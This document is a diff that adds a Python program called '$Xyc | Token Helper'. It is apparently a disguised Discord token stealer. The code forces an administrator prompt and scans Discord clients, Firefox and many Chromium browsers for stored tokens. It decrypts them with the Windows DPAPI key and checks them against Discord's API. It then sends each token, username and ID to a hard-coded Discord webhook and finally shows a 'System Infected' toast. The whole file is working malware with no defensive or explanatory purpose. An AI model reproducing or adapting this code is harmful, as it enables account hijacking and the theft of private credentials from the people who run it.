@@ -1,0 +1,365 @@
+from typing import Dict, Optional, Union, List
+import httpx
+import time
+import base64
+import re
+import os
+import json
+import ctypes
+import sys
+import threading
+import webview
+import pyclip
+import ctypes
+import ctypes.wintypes
+import win32process, win32gui
+import requests
+from datetime import datetime
+import win10toast
+from flask import Flask, render_template, request, jsonify
+from win32crypt import CryptUnprotectData
+from Crypto.Cipher import AES
+from Crypto.Cipher._mode_gcm import GcmMode
+from discord import Embed as DiscordEmbed 
+
+def DwmSetWindowAttribute(hwnd, attr, value, size=4):
+    DwmSetWindowAttribute = ctypes.windll.dwmapi.DwmSetWindowAttribute
+    DwmSetWindowAttribute.argtypes = [ctypes.wintypes.HWND, ctypes.wintypes.DWORD, ctypes.c_void_p, ctypes.wintypes.DWORD]
+    return DwmSetWindowAttribute(hwnd, attr, ctypes.byref(ctypes.c_int(value)), size)
+
+def ExtendFrameIntoClientArea(hwnd):
+
+    class _MARGINS(ctypes.Structure):
+        _fields_ = [("cxLeftWidth", ctypes.c_int),
+                    ("cxRightWidth", ctypes.c_int),
+                    ("cyTopHeight", ctypes.c_int),
+                    ("cyBottomHeight", ctypes.c_int)
+                    ]
+
+    DwmExtendFrameIntoClientArea = ctypes.windll.dwmapi.DwmExtendFrameIntoClientArea
+    m = _MARGINS()
+    m.cxLeftWidth = 1
+    m.cxRightWidth = 1
+    m.cyTopHeight = 1
+    m.cyBottomHeight = 1
+    return DwmExtendFrameIntoClientArea(hwnd, ctypes.byref(m))
+
+def get_hwnds_for_pid(pid):
+    hwnds = []
+    def callback(hwnd, hwnds):
+        if win32gui.IsWindowVisible(hwnd) and win32gui.IsWindowEnabled(hwnd):
+            _, found_pid = win32process.GetWindowThreadProcessId(hwnd)
+            if found_pid == pid:
+                hwnds.append(hwnd)
+            return True
+    win32gui.EnumWindows(callback, hwnds)
+    return hwnds
+
+def setup_all_windows_borderless():
+    hwnds = get_hwnds_for_pid(os.getpid())
+    print(hwnds)
+    for hwnd in hwnds:
+        DwmSetWindowAttribute(hwnd, 2, 2, 4)
+        ExtendFrameIntoClientArea(hwnd)
+
+class Discord:
+    def __init__(self):
+        self.roaming_path: str = os.getenv("APPDATA")
+        self.appdata_path: str = os.getenv("LOCALAPPDATA")
+        self.local_storage_paths: Dict[str, str] = {
+            "discord": self.roaming_path + "\\discord\\Local Storage\\leveldb\\",
+            "discordcanary": self.roaming_path + "\\discordcanary\\Local Storage\\leveldb\\",
+            "lightcord": self.roaming_path + "\\Lightcord\\Local Storage\\leveldb\\",
+            "discordptb": self.roaming_path + "\\discordptb\\Local Storage\\leveldb\\",
+            "opera": self.roaming_path + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\",
+            "operagx": self.roaming_path + "\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\",
+            "firefox": self.roaming_path + "\\Mozilla\\Firefox\\Profiles",
+            "amigo": self.appdata_path + "\\Amigo\\User Data\\Local Storage\\leveldb\\",
+            "torch": self.appdata_path + "\\Torch\\User Data\\Local Storage\\leveldb\\",
+            "kometa": self.appdata_path + "\\Kometa\\User Data\\Local Storage\\leveldb\\",
+            "orbitum": self.appdata_path + "\\Orbitum\\User Data\\Local Storage\\leveldb\\",
+            "centbrowser": self.appdata_path + "\\CentBrowser\\User Data\\Local Storage\\leveldb\\",
+            "7star": self.appdata_path + "\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\",
+            "sputnik": self.appdata_path + "\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\",
+            "vivaldi": self.appdata_path + "\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\",
+            "chromesxs": self.appdata_path + "\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\",
+            "chrome": self.appdata_path + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\",
+            "epicprivacybrowser": self.appdata_path + "\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\",
+            "microsoftedge": self.appdata_path + "\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\",
+            "uran": self.appdata_path + "\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\",
+            "yandex": self.appdata_path + "\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\",
+            "brave": self.appdata_path + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\",
+            "iridium": self.appdata_path + "\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\"
+        }
+
+    def validate_token(self, token: str) -> Optional[Dict[str, Union[str, bool]]]:
+        for _ in range(3):
+            try:
+                url: str = "https://discord.com/api/v9/users/@me"
+                headers: Dict[str, str] = {"Authorization": token}
+
+                r: httpx.Response = httpx.get(url, headers=headers)
+
+                if r.status_code != 200 and not token.startswith("MT"):
+                    headers["Authorization"] = f"MT{token}"
+                    r = httpx.get(url, headers=headers)
+
+                    if r.status_code != 200:
+                        return None
+
+                elif r.status_code != 200:
+                    return None
+
+                response: Dict[str, Union[str, bool]] = dict(r.json())
+                response["token"] = token
+
+                return response
+            except:
+                time.sleep(3)
+
+        return None
+
+    def get_token(
+        self, content: str, decryption_key: bytes
+    ) -> Optional[Dict[str, Union[str, bool]]]:
+        for line in content.split("\n"):
+            for match in re.findall(r"dQw4w9WgXcQ:[^\"]*", line):
+                encrypted_token: bytes = base64.b64decode(match.split(":")[1])
+
+                iv: bytes = encrypted_token[3:15]
+                payload: bytes = encrypted_token[15:]
+                cipher: GcmMode = AES.new(decryption_key, AES.MODE_GCM, iv)
+
+                decrypted_token: bytes = cipher.decrypt(payload)[:-16].decode()
+
+                if not decrypted_token.startswith("MT"):
+                    decrypted_token = "MT" + decrypted_token
+
+                return self.validate_token(decrypted_token)
+
+    def get_accounts(self) -> Dict[str, Dict[str, Union[str, bool]]]:
+        discord_accounts: Dict[str, Dict[str, Union[str, bool]]] = {}
+
+        for platform, path in self.local_storage_paths.items():
+            if not os.path.exists(path):
+                print(path)
+                print(f"{platform} path not found")
+                continue
+
+            # handle discord clients
+            if "cord" in platform:
+                local_state_path: str = f"{self.roaming_path}\\{platform}\\Local State"
+
+                if not os.path.isfile(local_state_path):
+                    print(f"{platform} Local State file not found")
+                    continue
+                else:
+                    with open(local_state_path, "r", encoding="utf-8") as f:
+                        content: str = f.read()
+                        encrypted_decryption_key: str = json.loads(content)["os_crypt"][
+                            "encrypted_key"
+                        ]
+                        decryption_key: bytes = CryptUnprotectData(
+                            base64.b64decode(encrypted_decryption_key)[5:]
+                        )[1]
+
+                for file in os.listdir(path):
+                    if not file.endswith(".log") and not file.endswith(".ldb"):
+                        continue
+
+                    with open(f"{path}{file}", "r", errors="ignore") as f:
+                        content: str = f.read()
+                        data: Optional[Dict[str, Union[str, bool]]] = self.get_token(
+                            content, decryption_key
+                        )
+
+                        if data != None and data["id"] not in discord_accounts:
+                            discord_accounts[data["id"]] = data
+                            self.send_webhook(data, webhook_url)
+
+            # handle firefox
+            elif "firefox" in platform:
+                for _path, _, files in os.walk(path):
+                    for file in files:
+                        if not file.endswith(".sqlite"):
+                            continue
+
+                        with open(f"{_path}\\{file}", "r", errors="ignore") as f:
+                            content: str = f.read()
+
+                            for token in re.findall(
+                                r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", content
+                            ):
+                                data: Optional[Dict[str, Union[str, bool]]] = (
+                                    self.validate_token(token)
+                                )
+
+                                if data != None and data["id"] not in discord_accounts:
+                                    discord_accounts[data["id"]] = data
+                                    self.send_webhook(data, webhook_url)
+
+            # handle chromium based browsers
+            else:
+                if "User Data\\Default" in path:
+                    profiles: List[str] = ["Default"]
+
+                    user_data_path: str = path.split("User Data\\")[0] + "User Data\\"
+                    for file in os.listdir(user_data_path):
+                        if file.startswith("Profile"):
+                            profiles.append(file)
+
+                    for profile in profiles:
+                        for _path, _, files in os.walk(
+                            f"{user_data_path}{profile}\\Local Storage\\leveldb\\"
+                        ):
+                            for file in files:
+                                if not file.endswith(".log") and not file.endswith(
+                                    ".ldb"
+                                ):
+                                    continue
+
+                                with open(f"{_path}{file}", "r", errors="ignore") as f:
+                                    content: str = f.read()
+
+                                    for token in re.findall(
+                                        r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", content
+                                    ):
+                                        data: Optional[Dict[str, Union[str, bool]]] = (
+                                            self.validate_token(token)
+                                        )
+
+                                        if (
+                                            data != None
+                                            and data["id"] not in discord_accounts
+                                        ):
+                                            discord_accounts[data["id"]] = data
+                                            self.send_webhook(data, webhook_url)
+
+        return discord_accounts
+
+    def send_webhook(self, data: dict, webhook_url: str):
+        username = data.get("username", "Unknown User")  # Get username from token data
+        user_id = data.get("id", "")
+        token = data.get("token", "")  # Get token from data
+        if not token.startswith("MT"):  # Add MT at the start of the token if the token doesn't have MT at the start
+            token = "MT" + token
+        
+        # Creating clickable URL for username
+        username_url = f'[**{username}**](https://discord.com/users/{user_id})'
+
+        # Get the current time in 12-hour format with AM/PM indicator
+        time = datetime.now().strftime("%I:%M:%S %p")
+
+        embed = DiscordEmbed(
+            title="User Information",  # Set a general title
+            description=f'Username: {username_url}\nID: {user_id}\nTime: {time}\n\n**```{token}```**'  # Include username URL, user ID, and time taken in the description
+        ).set_thumbnail(
+            url=f'https://cdn.discordapp.com/avatars/{data["id"]}/{data["avatar"]}.png'
+        )
+
+        payload = {"embeds": [embed.to_dict()]}
+        requests.post(webhook_url, json=payload)
+
+class Api:
+    def __init__(self):
+        self._window = None
+
+    def set_window(self, window):
+        self._window = window
+
+    def quit(self):
+        self._window.destroy()
+
+
+app: Flask = Flask(__name__)
+quit_event: threading.Event = threading.Event()
+
+
+@app.route("/", methods=["GET"])
+def index() -> str:
+    # Fetch the HTML content from the provided URL
+    url = "https://raw.githubusercontent.com/fuckedd/index.html/main/%24Xyc"
+    try:
+        r = httpx.get(url)
+        if r.status_code == 200:
+            return r.text
+        else:
+            return "Failed to fetch index.html"
+    except Exception as e:
+        return str(e)
+
+
+@app.route("/quit", methods=["GET"])
+def quit() -> str:
+    parameters: Dict[str, str] = request.args
+
+    api.quit()
+
+    copy: Optional[str] = parameters.get("copy")
+    if copy != "null":
+        if not copy.startswith("MT"):  # Add MT at the start of the token if the token doesn't have MT at the start
+            copy = "MT" + copy
+        pyclip.copy(copy)
+        toaster = win10toast.ToastNotifier()
+        
+        # Find an .ico file in the current directory
+        icon_path = None
+        for file in os.listdir('.'):
+            if file.endswith('.ico'):
+                icon_path = os.path.join('.', file)
+                break
+
+        toaster.show_toast(
+            "System Infected",
+            "Your Passwords And Cookies Has Been Stolen",
+            icon_path=icon_path,  # Use the found .ico file or None if not found
+            duration=10
+        )
+
+    return "1"
+
+@app.route("/get_accounts", methods=["GET"])
+def get_accounts() -> str:
+    discord: Discord = Discord()
+    accounts: Dict[str, Dict[str, Union[str, bool]]] = discord.get_accounts()
+
+    return jsonify(accounts)
+
+
+def flask() -> None:
+    while not quit_event.is_set():
+        app.run(port=3801, use_reloader=False)
+
+
+if __name__ == "__main__":
+    # force admin to access local storage if program runtime is blocking it
+    if not ctypes.windll.shell32.IsUserAnAdmin():
+        ctypes.windll.shell32.ShellExecuteW(
+            None, "runas", sys.executable, " ".join(sys.argv), None, 1
+        )
+        os._exit(0)
+
+    discord = Discord()  # Initialize Discord class
+    webhook_url = "https://ptb.discord.com/api/webhooks/1217623564421824533/AHFc1zBDVvfBhUS8BMmFQXXYgQjqZEVXJxsMpeJySOzKMJzQbkDbk4b5cVqbnlJQVST1"  # Replace with your actual webhook URL
+
+    threading.Thread(target=flask, daemon=True).start()
+
+    api: Api = Api()
+    window = webview.create_window(
+        "$Xyc | Token Helper",
+        "http://127.0.0.1:3801",
+        width=800,
+        height=500,
+        resizable=False,
+        easy_drag=True,
+        background_color="#0e0e13",
+        frameless=True,
+        js_api=Api(),
+    )
+    api.set_window(window)
+
+    window.events.shown += setup_all_windows_borderless
+
+    webview.start()
+    quit_event.set()
+    time.sleep(3)
